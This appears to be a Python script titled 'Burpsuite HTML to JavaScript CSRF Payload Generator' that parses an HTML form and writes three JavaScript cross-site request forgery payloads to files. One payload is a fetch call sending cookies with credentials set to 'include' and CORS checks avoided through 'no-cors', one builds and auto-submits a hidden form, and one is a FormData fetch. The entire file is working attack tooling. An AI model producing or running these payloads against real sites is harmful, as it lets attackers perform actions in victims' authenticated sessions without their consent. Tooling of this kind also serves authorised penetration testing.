from bs4 import BeautifulSoup

print(r"""
________    _________      .__   _____  
\______ \  /   _____/ ____ |__| /  |  | 
 |    |  \ \_____  \_/ ___\|  |/   |  |_
 |    `   \/        \  \___|  /    ^   /
/_______  /_______  /\___  >__\____   | 
        \/        \/     \/        |__| 
                                        
Burpsuite HTML to JavaScript CSRF Payload Generator                                                                            
                                        
""")


# Step 1: Get the filename from the user
# This input will ask the user for the name of the HTML file containing the form data.
html_file = input("Please enter the name of the HTML file: ")

# Step 2: Read the HTML content from the file
# This block of code reads the HTML form from the provided file and stores its content in the 'html_payload' variable.
try:
    with open(html_file, 'r') as file:
        html_payload = file.read()
except FileNotFoundError:
    print(f"Error: The file '{html_file}' was not found.")
    exit(1)

# Step 3: Parse the HTML form using BeautifulSoup
# BeautifulSoup is used here to parse the HTML form, allowing us to extract important information like
# the form action (target URL), method (GET or POST), and input fields (form data).
soup = BeautifulSoup(html_payload, 'html.parser')
form = soup.find('form')

# Extract form attributes
# form_action: The URL where the form data will be submitted (from the 'action' attribute of the form).
# form_method: The method used for the request, such as GET or POST (from the 'method' attribute, default is POST).
form_action = form['action']  # URL for the request
form_method = form.get('method', 'POST').upper()  # Method (default to POST if not specified)

# Extract all input fields and their values
# This loop extracts all the input fields in the form and their corresponding values, storing them as key-value pairs
# in the 'form_data' dictionary. This is important for generating the payloads.
form_data = {}
for input_field in form.find_all('input'):
    if 'name' in input_field.attrs and 'value' in input_field.attrs:
        form_data[input_field['name']] = input_field['value']

# =================== PAYLOAD 1: fetch with plain form data (no URL encoding) ===================
# This payload generates a JavaScript fetch request using plain form data without URL encoding.
# Fetch is an API for making HTTP requests, and this payload is used to send the form data in the body
# of a POST request.

# Step 4.1: Generate the plain (non-URL-encoded) form body manually
# Here, we are manually building the body of the request by concatenating the key-value pairs from the form.
# Special characters will not be URL-encoded, and the body is in the format 'key=value&key=value'.
form_body = '&'.join([f"{key}={value}" for key, value in form_data.items()])

# Step 4.2: Generate the fetch JavaScript payload with plain form data
# The fetch payload is generated with the following structure:
# - method: POST (or the method specified by the form)
# - credentials: 'include' (this ensures that cookies and credentials are sent with the request)
# - headers: 'Content-Type' set to 'application/x-www-form-urlencoded' to simulate form submission
# - body: The form data in plain key-value pairs (no encoding)
js_payload_plain = "fetch('{}', {{\n".format(form_action)
js_payload_plain += "    method: '{}',\n".format(form_method)
js_payload_plain += "    credentials: 'include',\n"  # Including credentials (cookies)
js_payload_plain += "    headers: {\n"
js_payload_plain += "        'Content-Type': 'application/x-www-form-urlencoded'\n"
js_payload_plain += "    },\n"
js_payload_plain += "    body: '{}',\n".format(form_body)  # Plain form data, no encoding
js_payload_plain += "    mode: 'no-cors'\n"  # 'no-cors' mode prevents CORS enforcement
js_payload_plain += "});"

# Write this payload to a file
output_file_plain = 'csrf_fetch_payload.js'
with open(output_file_plain, 'w') as js_file:
    js_file.write(js_payload_plain)

# =================== PAYLOAD 2: Dynamic form creation ===================
# This payload simulates a form submission by dynamically creating an HTML form in JavaScript.
# The form is built in the browser's DOM (Document Object Model), and when it's appended and submitted,
# it behaves just like a real form submission would in HTML.

# Step 4.3: Generate the JavaScript dynamic form creation payload
# We create a JavaScript object containing the form data, then build the form by appending hidden input fields
# for each key-value pair. The form is then appended to the document body and submitted programmatically.
js_payload_form_creation = "// Define the form data as an object\n"
js_payload_form_creation += "const formData = {\n"
for key, value in form_data.items():
    js_payload_form_creation += f"    {key}: '{value}',\n"
js_payload_form_creation = js_payload_form_creation.rstrip(",\n")  # Remove trailing comma
js_payload_form_creation += "\n};\n\n"

# Create the form and input elements dynamically
# This block creates a new form element and sets its 'method' and 'action' attributes to match the form data.
js_payload_form_creation += "// Create a new form element\n"
js_payload_form_creation += "const form = document.createElement('form');\n"
js_payload_form_creation += f"form.method = '{form_method}';\n"
js_payload_form_creation += f"form.action = '{form_action}';\n\n"

# Append hidden input fields to the form
# Here, we dynamically create hidden input fields based on the form data and append them to the form.
js_payload_form_creation += "// Create input elements and append to the form\n"
js_payload_form_creation += "Object.keys(formData).forEach(key => {\n"
js_payload_form_creation += "    const input = document.createElement('input');\n"
js_payload_form_creation += "    input.type = 'hidden';\n"
js_payload_form_creation += "    input.name = key;\n"
js_payload_form_creation += "    input.value = formData[key];\n"
js_payload_form_creation += "    form.appendChild(input);\n"
js_payload_form_creation += "});\n\n"

# Append form to the document body and submit
# Finally, we append the newly created form to the document body and submit it automatically.
js_payload_form_creation += "// Append the form to the document body\n"
js_payload_form_creation += "document.body.appendChild(form);\n\n"
js_payload_form_creation += "// Submit the form\n"
js_payload_form_creation += "form.submit();"

# Write this payload to a file
output_file_form_creation = 'csrf_dynamicform_payload.js'
with open(output_file_form_creation, 'w') as js_file:
    js_file.write(js_payload_form_creation)

# =================== PAYLOAD 3: fetch with FormData ===================
# This payload generates a JavaScript fetch request using the FormData object, which is typically used
# for form submissions that include files, but can also be used for normal form fields.
# FormData allows you to easily append key-value pairs and send them in a POST request.

# Step 4.4: Generate the JavaScript fetch payload using FormData
# FormData is built by appending each key-value pair, and the fetch request sends the form data as the body.
js_payload_formdata = "const formData = new FormData();\n"
for key, value in form_data.items():
    js_payload_formdata += f"formData.append('{key}', '{value}');\n"

# Create the fetch request with FormData
# Similar to the plain form data payload, but instead of manually creating the body,
# we use FormData to append the key-value pairs.
js_payload_formdata += "\nfetch('{}', {{\n".format(form_action)
js_payload_formdata += "    method: '{}',\n".format(form_method)
js_payload_formdata += "    credentials: 'include',\n"
js_payload_formdata += "    body: formData,\n"  # Using FormData instead of a plain string
js_payload_formdata += "    mode: 'no-cors'\n"  # 'no-cors' mode prevents CORS enforcement
js_payload_formdata += "});"

# Write this payload to a file
output_file_formdata = 'csrf_fetch_formdata.js'
with open(output_file_formdata, 'w') as js_file:
    js_file.write(js_payload_formdata)

# Output completion message
print(f"JavaScript payloads have been written to '{output_file_plain}', '{output_file_form_creation}', and '{output_file_formdata}'")
